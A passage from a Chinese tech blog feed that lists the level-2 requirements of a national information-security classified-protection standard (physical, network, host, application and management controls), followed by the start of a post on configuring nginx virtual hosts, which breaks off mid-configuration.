应指定专门的部门或人员进行账号管理，对申请账号、建立账号、删除账号等进行控制。</span><br><span class="line"></span><br><span class="line">恶意代码防范管理：</span><br><span class="line">a) 应提高所有用户的防恶意代码意识，告知对外来计算机或存储设备接入系统前进行恶意代码检查等；</span><br><span class="line">b) 应对恶意代码防范要求做出规定，包括防恶意代码软件的授权使用、恶意代码库升级、恶意代码的定期查杀等。</span><br><span class="line"></span><br><span class="line">备份与恢复管理：</span><br><span class="line">a) 应识别需要定期备份的重要业务信息、系统数据及软件系统等；</span><br><span class="line">b) 应规定备份信息的备份方式、备份频度、存储介质、保存期等。</span><br><span class="line"></span><br><span class="line">安全事件处置：</span><br><span class="line">a) 应报告所发现的安全弱点和可疑事件；</span><br><span class="line">b) 应明确安全事件的报告和处置流程，规定安全事件的现场处理、事件报告和后期恢复的管理职责。</span><br></pre></td></tr></table></figure><h1 id="第二级安全要求"><a href="#第二级安全要求" class="headerlink" title="第二级安全要求"></a>第二级安全要求</h1><h3 id="技术要求-1"><a href="#技术要求-1" class="headerlink" title="技术要求"></a>技术要求</h3><h4 id="物理和环境安全-1"><a href="#物理和环境安全-1" class="headerlink" title="物理和环境安全"></a>物理和环境安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">物理位置选择：</span><br><span class="line">a) 机房场地应选择在具有防震、防风和防雨等能力的建筑内；</span><br><span class="line">b) 机房场地应避免设在建筑物的顶层或地下室，否则应加强防水和防潮措施。</span><br><span class="line"></span><br><span class="line">物理访问控制：</span><br><span class="line">机房出入口应安排专人值守或配置电子门禁系统，控制、鉴别和记录进入的人员。</span><br><span class="line"></span><br><span class="line">防盗窃和防破坏:</span><br><span class="line">a) 应将机房设备或主要部件进行固定，并设置明显的不易除去的标记；</span><br><span class="line">b) 应将通信线缆铺设在隐蔽处，可铺设在地下或管道中。</span><br><span class="line"></span><br><span class="line">防雷击:</span><br><span class="line">应将各类机柜、设施和设备等通过接地系统安全接地。</span><br><span class="line"></span><br><span class="line">防火:</span><br><span class="line">a) 机房应设置火灾自动消防系统，能够自动检测火情、自动报警，并自动灭火；</span><br><span class="line">b) 机房及相关的工作房间和辅助房应采用具有耐火等级的建筑材料。  </span><br><span class="line"></span><br><span class="line">防水和防潮:</span><br><span class="line">a) 应采取措施防止雨水通过机房窗户、屋顶和墙壁渗透；</span><br><span class="line">b) 应采取措施防止机房内水蒸气结露和地下积水的转移与渗透。</span><br><span class="line"></span><br><span class="line">防静电：</span><br><span class="line">应安装防静电地板并采用必要的接地防静电措施。</span><br><span class="line"></span><br><span class="line">温湿度控制:</span><br><span class="line">机房应设置温湿度自动调节设施  ，使机房温、湿度的变化在设备运行所允许的范围之内。</span><br><span class="line"></span><br><span class="line">电力供应:</span><br><span class="line">a) 应在机房供电线路上配置稳压器和过电压防护设备；</span><br><span class="line">b) 应提供短期的备用电力供应，至少满足设备在断电情况下的正常运行要求。</span><br><span class="line"></span><br><span class="line">电磁防护：</span><br><span class="line">电源线和通信线缆应隔离铺设，避免互相干扰。</span><br></pre></td></tr></table></figure><h4 id="网络和通信安全-1"><a href="#网络和通信安全-1" class="headerlink" title="网络和通信安全"></a>网络和通信安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">网络架构要求包括:</span><br><span class="line">a) 应保证网络设备的业务处理能力满足业务高峰期需要；</span><br><span class="line">b) 应保证接入网络和核心网络的带宽满足业务高峰期需要；</span><br><span class="line">c) 应划分不同的网络区域，并按照方便管理和控制的原则为各网络区域分配地址；</span><br><span class="line">d) 应避免将重要网络区域部署在网络边界处且没有边界防护措施。</span><br><span class="line"></span><br><span class="line">通信传输:</span><br><span class="line">应采用校验码技术保证通信过程中数据的完整性。</span><br><span class="line"></span><br><span class="line">边界防护:</span><br><span class="line">应保证跨越边界的访问和数据流通过边界防护设备提供的受控接口进行通信。</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应在网络边界或区域之间根据访问控制策略设置访问控制规则，默认情况下除允许通信外受控</span><br><span class="line">接口拒绝所有通信；</span><br><span class="line">b) 应删除多余或无效的访问控制规则，优化访问控制列表，并保证访问控制规则数量最小化；</span><br><span class="line">c) 应对源地址、目的地址、源端口、目的端口和协议等进行检查，以允许/拒绝数据包进出；</span><br><span class="line">d) 应能根据会话状态信息为数据流提供明确的允许/拒绝访问的能力，控制粒度为端口级。</span><br><span class="line"></span><br><span class="line">入侵防范：</span><br><span class="line">应在关键网络节点处监视网络攻击行为。</span><br><span class="line"></span><br><span class="line">安全审计：</span><br><span class="line">a) 应在网络边界、重要网络节点进行安全审计，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计；</span><br><span class="line">b) 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息；</span><br><span class="line">c) 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。</span><br></pre></td></tr></table></figure><h4 id="设备和计算安全-1"><a href="#设备和计算安全-1" class="headerlink" title="设备和计算安全"></a>设备和计算安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 身份鉴别要求包括：</span><br><span class="line">a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并</span><br><span class="line">定期更换；</span><br><span class="line">b) 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动</span><br><span class="line">退出等相关措施。</span><br><span class="line"></span><br><span class="line">c) 当进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应对登录的用户分配账号和权限；</span><br><span class="line">b) 应重命名默认账号或修改默认口令；</span><br><span class="line">c) 应及时删除或停用多余的、过期的账号，避免共享账号的存在。</span><br><span class="line"></span><br><span class="line">d) 应授予管理用户所需的最小权限，实现管理用户的权限分离。</span><br><span class="line"></span><br><span class="line">安全审计：</span><br><span class="line">a) 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计；</span><br><span class="line">b) 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息；</span><br><span class="line">c) 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。</span><br><span class="line"></span><br><span class="line">入侵防范要求包括：</span><br><span class="line">a) 系统应遵循最小安装的原则，仅安装需要的组件和应用程序；</span><br><span class="line">b) 应关闭不需要的系统服务、默认共享和高危端口。</span><br><span class="line"></span><br><span class="line">c) 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制；</span><br><span class="line">d) 应能发现可能存在的漏洞，并在经过充分测试评估后，及时修补漏洞</span><br><span class="line"></span><br><span class="line">恶意代码防范：</span><br><span class="line">应安装防恶意代码软件或配置具有相应功能的软件，并定期进行升级和更新防恶意代码库。</span><br><span class="line"></span><br><span class="line">资源控制：</span><br><span class="line">应限制单个用户或进程对系统资源的最大使用限度。</span><br></pre></td></tr></table></figure><h4 id="应用和数据安全-1"><a href="#应用和数据安全-1" class="headerlink" title="应用和数据安全"></a>应用和数据安全</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">身份鉴别要求包括：</span><br><span class="line">a) 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，鉴别信息具有复杂度要求并定期更换；</span><br><span class="line">b) 应提供并启用登录失败处理功能，多次登录失败后应采取必要的保护措施；</span><br><span class="line">c) 应强制用户首次登录时修改初始口令；</span><br><span class="line">d) 用户身份鉴别信息丢失或失效时，应采用鉴别信息重置或其他技术措施保证系统安全。</span><br><span class="line"></span><br><span class="line">安全审计</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应提供安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计；</span><br><span class="line">b) 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息；</span><br><span class="line">c) 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。</span><br><span class="line"></span><br><span class="line">访问控制要求包括：</span><br><span class="line">a) 应提供访问控制功能，对登录的用户分配账号和权限；</span><br><span class="line">b) 应重命名应用系统默认账号或修改这些账号的默认口令；</span><br><span class="line">c) 应及时删除或停用多余的、过期的账号，避免共享账号的存在。</span><br><span class="line"></span><br><span class="line">软件容错：</span><br><span class="line">a) 应提供数据有效性检验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求；</span><br><span class="line">b) 在故障发生时，应能够继续提供一部分功能，确保能够实施必要的措施。</span><br><span class="line"></span><br><span class="line">资源控制</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 当通信双方中的一方在一段时间内未作任何响应，另一方应能够自动结束会话；</span><br><span class="line">b) 应能够对系统的最大并发会话连接数进行限制；</span><br><span class="line">c) 应能够对单个账号的多重并发会话进行限制。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据完整性：</span><br><span class="line">应采用校验码技术保证重要数据在传输过程中的完整性。</span><br><span class="line"></span><br><span class="line">数据备份恢复：</span><br><span class="line">a) 应提供重要数据的本地数据备份与恢复功能；</span><br><span class="line"></span><br><span class="line">b) 应提供异地数据备份功能，利用通信网络将重要数据定时批量传送至备用场地。</span><br><span class="line"></span><br><span class="line">剩余信息保护：</span><br><span class="line">应保证鉴别信息所在的存储空间被释放或重新分配前得到完全清除。</span><br><span class="line"></span><br><span class="line">个人信息保护</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应仅采集和保存业务必需的用户个人信息；</span><br><span class="line">b) 应禁止未授权访问、使用用户个人信息。</span><br></pre></td></tr></table></figure><h3 id="管理要求-1"><a href="#管理要求-1" class="headerlink" title="管理要求"></a>管理要求</h3><h4 id="安全策略和管理制度-1"><a href="#安全策略和管理制度-1" class="headerlink" title="安全策略和管理制度"></a>安全策略和管理制度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">管理制度</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应对安全管理活动中的主要管理内容建立安全管理制度；</span><br><span class="line">b) 应对要求管理人员或操作人员执行的日常管理操作建立操作规程。</span><br><span class="line"></span><br><span class="line">制定和发布</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应指定或授权专门的部门或人员负责安全管理制度的制定；</span><br><span class="line">b) 安全管理制度应通过正式、有效的方式发布，并进行版本控制。</span><br><span class="line"></span><br><span class="line">评审和修订</span><br><span class="line">应定期对安全管理制度的合理性和适用性进行论证和审定，对存在不足或需要改进的安全管理制度进行修订</span><br></pre></td></tr></table></figure><h4 id="安全管理机构和人员-1"><a href="#安全管理机构和人员-1" class="headerlink" title="安全管理机构和人员"></a>安全管理机构和人员</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">岗位设置：</span><br><span class="line">a) 应设立信息安全管理工作的职能部门，设立安全主管、安全管理各个方面的负责人岗位，并</span><br><span class="line">定义各负责人的职责；</span><br><span class="line">b) 应设立系统管理员、网络管理员、安全管理员等岗位，并定义部门及各个工作岗位的职责。</span><br><span class="line"></span><br><span class="line">人员配备：</span><br><span class="line">应配备一定数量的系统管理员、网络管理员、安全管理员等。</span><br><span class="line"></span><br><span class="line">授权和审批：</span><br><span class="line"></span><br><span class="line">授权和审批</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应根据各个部门和岗位的职责明确授权审批事项、审批部门和批准人等；</span><br><span class="line">b) 应针对系统变更、重要操作、物理访问和系统接入等事项执行审批过程。</span><br><span class="line"></span><br><span class="line">沟通和合作</span><br><span class="line">本项要求包括：</span><br><span class="line">a) 应加强各类管理人员之间、组织内部机构之间以及信息安全职能部门内部的合作与沟通，定期召开协调会议，共同协作处理信息安全问题；</span><br><span class="line">b) 应加强与兄弟单位、公安机关、各类供应商、业界专家及安全组织的合作与沟通；</span><br><span class="line">c) 应建立外联单位联系列表，包括外联单位名称、合作内容、联系人和联系方式等信息。</span><br><span class="line"></span><br><span class="line">审核和检查</span><br><span class="line">应定期进行常规安全检查，检查内容包括系统日常运行、系统漏洞和数据备份等情况。</span><br><span class="line"></span><br><span class="line">人员录用：</span><br><span class="line">a) 应指定或授权专门的部门或人员负责人员录用；</span><br><span class="line">b) 应对被录用人员的身份、背景、专业资格和资质等进行审查。</span><br><span class="line"></span><br><span class="line">人员离岗：</span><br><span class="line">应及时终止离岗员工的所有访问权限，取回各种身份证件、钥匙、徽章等以及机构提供的软硬件设备</span><br><span class="line"></span><br><span class="line">安全意识教育和培训：</span><br><span class="line">应对各类人员进行安全意识教育和岗位技能培训，并告知相关的安全责任和惩戒措施。</span><br><span class="line"></span><br><span class="line">外部人员访问管理：</span><br><span class="line">a) 应确保在外部人员物理访问受控区域前先提出书面申请，批准后由专人全程陪同，并登记备案；</span><br><span class="line">b) 应确保在外部人员接入网络访问系统前先提出书面申请，批准后由专人开设账号、分配权限，并登记备案；</span><br><span class="line">c) 外部人员离场后应及时清除其所有的访问权限。</span><br></pre></td></tr></table></figure><h4 id="安全建设管理-1"><a href="#安全建设管理-1" class="headerlink" title="安全建设管理"></a>安全建设管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">定级和备案：</span><br><span class="line">a) 应以书面的形式说明保护对象的边界、安全保护等级及确定等级的方法和理由；</span><br><span class="line">b) 应组织相关部门和有关安全技术专家对定级结果的合理性和正确性进行论证和审定；</span><br><span class="line">c) 应确保定级结果经过相关部门的批准；</span><br><span class="line">d) 应将备案材料报主管部门和相应公安机关备案。</span><br><span class="line"></span><br><span class="line">安全方案设计：</span><br><span class="line">a) 应根据安全保护等级选择基本安全措施，依据风险分析的结果补充和调整安全措施；</span><br><span class="line">b) 应根据保护对象的安全保护等级进行安全方案设计；</span><br><span class="line">c) 应组织相关部门和有关安全专家对安全方案的合理性和正确性进行论证和审定，经过批准后才能正式实施</span><br><span class="line"></span><br><span class="line">产品采购和使用：</span><br><span class="line">a) 应确保信息安全产品采购和使用符合国家的有关规定；</span><br><span class="line">b) 应确保密码产品采购和使用符合国家密码主管部门的要求。</span><br><span class="line"></span><br><span class="line">自行软件开发：</span><br><span class="line"></span><br><span class="line">a) 应确保开发环境与实际运行环境物理分开，测试数据和测试结果受到控制；</span><br><span class="line"></span><br><span class="line">b) 应确保在软件开发过程中对安全性进行测试，在软件安装前对可能存在的恶意代码进行检测。</span><br><span class="line"></span><br><span class="line">外包软件开发：</span><br><span class="line">a) 应在软件交付前检测软件质量和其中可能存在的恶意代码；</span><br><span class="line">b) 应要求开发单位提供软件设计文档和使用指南。</span><br><span class="line"></span><br><span class="line">工程实施：</span><br><span class="line">a) 应指定或授权专门的部门或人员负责工程实施过程的管理；</span><br><span class="line">b) 应制定工程实施方案控制安全工程实施过程。</span><br><span class="line"></span><br><span class="line">测试验收：</span><br><span class="line">a) 在制订测试验收方案，并依据测试验收方案实施测试验收，形成测试验收报告；</span><br><span class="line">b) 应进行上线前的安全性测试，并出具安全测试报告。</span><br><span class="line"></span><br><span class="line">系统交付：</span><br><span class="line">a) 应制定交付清单，并根据交付清单对所交接的设备、软件和文档等进行清点；</span><br><span class="line">b) 应对负责运行维护的技术人员进行相应的技能培训；</span><br><span class="line">c) 应确保提供建设过程中的文档和指导用户进行运行维护的文档。</span><br><span class="line"></span><br><span class="line">等级测评：</span><br><span class="line">a) 应定期进行等级测评，发现不符合相应等级保护标准要求的及时整改；</span><br><span class="line">b) 应在发生重大变更或级别发生变化时进行等级测评；</span><br><span class="line">c) 应选择具有国家相关技术资质和安全资质的测评单位进行等级测评。</span><br><span class="line"></span><br><span class="line">服务供应商选择：</span><br><span class="line">a) 应确保服务供应商的选择符合国家的有关规定；</span><br><span class="line">b) 应与选定的服务供应商签订相关协议，明确整个服务供应链各方需履行的信息安全相关义务。</span><br></pre></td></tr></table></figure><h4 id="安全运维管理-1"><a href="#安全运维管理-1" class="headerlink" title="安全运维管理"></a>安全运维管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">环境管理：</span><br><span class="line">a) 应指定专门的部门或人员负责机房安全，对机房出入进行管理，定期对机房供配电、空调、温湿度控制、消防等设施进行维护管理；</span><br><span class="line">b) 应建立机房安全管理制度，对有关机房物理访问，物品带进、带出机房和机房环境安全等方面的管理作出规定；</span><br><span class="line">c) 应不在重要区域接待来访人员和桌面上没有包含敏感信息的纸档文件、移动介质等。</span><br><span class="line"></span><br><span class="line">资产管理：</span><br><span class="line">应编制并保存与保护对象相关的资产清单，包括资产责任部门、重要程度和所处位置等内容。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">介质管理 :</span><br><span class="line"></span><br><span class="line">a) 应确保介质存放在安全的环境中，对各类介质进行控制和保护，实行存储环境专人管理，并根据存档介质的目录清单定期盘点；</span><br><span class="line">b) 应对介质在物理传输过程中的人员选择、打包、交付等情况进行控制，并对介质的归档和查询等进行登记记录。</span><br><span class="line"></span><br><span class="line">设备维护管理：</span><br><span class="line"></span><br><span class="line">a) 应对各种设备（包括备份和冗余设备）、线路等指定专门的部门或人员定期进行维护管理；</span><br><span class="line">b) 应建立配套设施、软硬件维护方面的管理制度，对其维护进行有效的管理，包括明确维护人员的责任、涉外维修和服务的审批、维修过程的监督控制等。</span><br><span class="line"></span><br><span class="line">漏洞和风险管理：</span><br><span class="line">应采取必要的措施识别安全漏洞和隐患，对发现的安全漏洞和隐患及时进行修补或评估可能的影响后进行修补。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">网络和系统安全管理：</span><br><span class="line">a) 应划分不同的管理员角色进行网络和系统的运维管理，明确各个角色的责任和权限；</span><br><span class="line">b) 应指定专门的部门或人员进行账号管理，对申请账号、建立账号、删除账号等进行控制；</span><br><span class="line">c) 应建立网络和系统安全管理制度，对安全策略、 账号管理、配置管理、日志管理、日常操作、升级与打补丁、口令更新周期等方面作出规定；</span><br><span class="line">d) 应制定重要设备的配置和操作手册，依据手册对设备进行安全配置和优化配置等；</span><br><span class="line">e) 应详细记录运维操作日志，包括日常巡检工作、运行维护记录、参数的设置和修改等内容。</span><br><span class="line"></span><br><span class="line">配置管理：</span><br><span class="line">应记录和保存基本配置信息，包括网络拓扑结构、各个设备安装的软件组件、软件组件的版本和</span><br><span class="line">补丁信息、各个设备或软件组件的配置参数等。</span><br><span class="line"></span><br><span class="line">密码管理：</span><br><span class="line">a) 应使用符合国家密码管理规定的密码技术和产品；</span><br><span class="line">b) 应按照国家密码管理的要求开展密码技术和产品的应用。</span><br><span class="line"></span><br><span class="line">变更管理：</span><br><span class="line">应明确系统变更需求，变更前根据变更需求制定变更方案，变更方案经过评审、审批后方可实施。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恶意代码防范管理：</span><br><span class="line">a) 应提高所有用户的防恶意代码意识，告知对外来计算机或存储设备接入系统前进行恶意代码检查等；</span><br><span class="line">b) 应对恶意代码防范要求做出规定，包括防恶意代码软件的授权使用、恶意代码库升级、恶意代码的定期查杀等。</span><br><span class="line"></span><br><span class="line">备份与恢复管理：</span><br><span class="line">a) 应识别需要定期备份的重要业务信息、系统数据及软件系统等；</span><br><span class="line">b) 应规定备份信息的备份方式、备份频度、存储介质、保存期等；</span><br><span class="line">c) 应根据数据的重要性和数据对系统运行的影响，制定数据的备份策略和恢复策略、备份程序和恢复程序等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安全事件处置：</span><br><span class="line">a) 应报告所发现的安全弱点和可疑事件；</span><br><span class="line">b) 应制定安全事件报告和处置管理制度，明确不同安全事件的报告、处置和响应流程，规定安全事件的现场处理、事件报告和后期恢复的管理职责等；</span><br><span class="line">c) 应在安全事件报告和响应处理过程中，分析和鉴定事件产生的原因，收集证据，记录处理过程，总结经验教训。</span><br><span class="line"></span><br><span class="line">应急预案管理：</span><br><span class="line">a) 应制定重要事件的应急预案，包括应急处理流程、系统恢复流程等内容；</span><br><span class="line">b) 应从人力、设备、技术和财务等方面确保应急预案的执行有足够的资源保障；</span><br><span class="line">c) 应定期对系统相关的人员进行应急预案培训，并进行应急预案的演练。</span><br><span class="line"></span><br><span class="line">外包运维管理：</span><br><span class="line">a) 应确保外包运维服务商的选择符合国家的有关规定；</span><br><span class="line">b) 应与选定的外包运维服务商签订相关的协议，明确约定外包运维的范围、工作内容。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全等级保护" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
    
      <category term="安全等级保护" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>nginx配置虚拟主机的三种方法</title>
    <link href="http://yoursite.com/2018/09/03/nginx%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA/"/>
    <id>http://yoursite.com/2018/09/03/nginx配置虚拟主机/</id>
    <published>2018-09-03T05:57:05.000Z</published>
    <updated>2018-09-03T07:08:11.924Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-209.png" alt="upload successful"></p><h1 id="三种方法"><a href="#三种方法" class="headerlink" title="三种方法"></a>三种方法</h1><p>nginx下，一个server标签就是一个虚拟主机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、基于域名的虚拟主机，通过域名来区分虚拟主机——应用：外部网站</span><br><span class="line"></span><br><span class="line">2、基于端口的虚拟主机，通过端口来区分虚拟主机——应用：公司内部网站，外部网站的管理后台</span><br><span class="line"></span><br><span class="line">3、基于ip的虚拟主机，几乎不用。</span><br></pre></td></tr></table></figure></p><h1 id="具体设置"><a href="#具体设置" class="headerlink" title="具体设置"></a>具体设置</h1><h4 id="1、基于域名配置虚拟主机配置："><a href="#1、基于域名配置虚拟主机配置：" class="headerlink" title="1、基于域名配置虚拟主机配置："></a>1、基于域名配置虚拟主机配置：</h4><p>需要建立/data/www /data/bbs目录，windows本地hosts添加虚拟机ip地址对应的域名解析；</p><p>对应域名网站目录下新增index.html文件； </p><p>nginx.conf配置文件新增如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">   listen 80;</span><br><span class="line">   server_name www.xxxxx.com;</span><br><span class="line">   index index.html;</span><br><span class="line">   root /data/www;</span><br><span 